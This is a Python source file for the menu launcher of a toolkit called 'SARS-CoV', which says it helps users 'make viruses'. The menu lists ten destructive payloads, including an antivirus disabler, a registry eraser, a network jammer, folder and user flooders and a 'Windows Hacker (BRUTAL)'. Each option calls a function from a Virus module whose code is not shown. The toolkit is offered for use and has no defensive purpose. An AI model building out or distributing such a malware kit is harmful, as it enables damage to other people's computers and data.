from termcolor import cprint
import os

os.system('cls')
cprint("\n===========================================================================================================================================================",'red')
cprint("======================================================================================================================================================== =", 'red')
cprint("===========================================================================================================================================================\n", 'red')

cprint("                                           ░██████╗░█████╗░██████╗░░██████╗░░░░░░░█████╗░░█████╗░██╗░░░██╗", 'blue')
cprint("                                           ██╔════╝██╔══██╗██╔══██╗██╔════╝░░░░░░██╔══██╗██╔══██╗██║░░░██║", 'blue')
cprint("                                           ╚█████╗░███████║██████╔╝╚█████╗░█████╗██║░░╚═╝██║░░██║╚██╗░██╔╝", 'blue')
cprint("                                           ░╚═══██╗██╔══██║██╔══██╗░╚═══██╗╚════╝██║░░██╗██║░░██║░╚████╔╝░", 'blue')
cprint("                                           ██████╔╝██║░░██║██║░░██║██████╔╝░░░░░░╚█████╔╝╚█████╔╝░░╚██╔╝░░", 'blue')
cprint("                                           ╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░░░░░░░░╚════╝░░╚════╝░░░░╚═╝░░░", 'blue')

cprint("\n===========================================================================================================================================================", 'red')
cprint("===========================================================================================================================================================", 'red')
cprint("===========================================================================================================================================================\n", 'red')

cprint('Welcome to SARS-CoV. This software will help you make viruses.\n', 'cyan', attrs=['bold'])

try:
    while True:
        cprint('A: Antivirus Hacker', 'yellow', attrs=['bold'])
        cprint('B: Application Bomber', 'yellow', attrs=['bold'])
        cprint('C: Registry Key Eraser', 'yellow', attrs=['bold'])
        cprint('D: Internet Jammer', 'yellow', attrs=['bold'])
        cprint('E: Endless KeyDown', 'yellow', attrs=['bold'])
        cprint('F: Folder Flooder', 'yellow', attrs=['bold'])
        cprint('G: CD Popper', 'yellow', attrs=['bold'])
        cprint('H: Background Process Producer', 'yellow', attrs=['bold'])
        cprint('I: User Flooder', 'yellow', attrs=['bold'])
        cprint('J: Windows Hacker (BRUTAL)', 'yellow', attrs=['bold'])
        cprint('exit(): Go Back', 'yellow', attrs=['bold'])

        cprint('Enter the alphabets in \'CAPITAL\'s\' only: ', 'cyan', attrs=['bold'])
        choice = input()

        if choice == "A":
            from Virus import virus_A

            virus_A()

        elif choice == "B":
            from Virus import virus_B

            virus_B()

        elif choice == "C":
            from Virus import virus_C

            virus_C()

        elif choice == "D":
            from Virus import virus_D

            virus_D()

        elif choice == "E":
            from Virus import virus_E

            virus_E()

        elif choice == "F":
            from Virus import virus_F

            virus_F()

        elif choice == "G":
            from Virus import virus_G

            virus_G()

        elif choice == "H":
            from Virus import virus_H

            virus_H()

        elif choice == "I":
            from Virus import virus_I

            virus_I()

        elif choice == "J":
            from Virus import virus_J

            virus_J()

        elif choice == "exit()":
            os.system('python Kissing_Bug.py')

        else:
            cprint('\nPlease enter only \'CAPITAL\' letter.', 'red', attrs=['bold'])

except Exception as e:
    cprint('Something might have gone wrong please wait?', 'red', attrs=['bold'])
